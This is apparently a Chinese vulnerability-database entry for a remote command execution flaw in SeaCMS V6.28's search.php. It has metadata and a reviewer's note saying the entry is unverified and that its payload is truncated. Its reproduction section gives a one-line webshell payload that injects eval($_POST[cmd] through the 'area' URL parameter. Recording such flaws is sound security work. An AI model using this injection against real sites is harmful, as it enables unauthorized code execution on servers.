---
source: "hatch 补库批 20260928"
product: "SeaCMS6.28"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Seacms V6.28 远程命令执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：search.php模板解析，具体输入和旧PHP条件未给"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-33b76b6fe9e80656e6e1af65"
entity_id: "ve-33b76b6fe9e80656e6e1af65"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：search.php模板解析，具体输入和旧PHP条件未给

- **代码与转录边界（1）**：唯一URL在eval($_POST\[cmd\]处截断，括号/模板后缀未闭合，无法作为完整PoC。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **事实待核（2）**：无源码/响应/鉴权/来源；版本只有标题。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 海洋CMS V6.28 命令执行

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    一句话payload，密码cmd:

    http://0-sec.org/search.php?searchtype=5&tid=&area=eval($_POST[cmd]
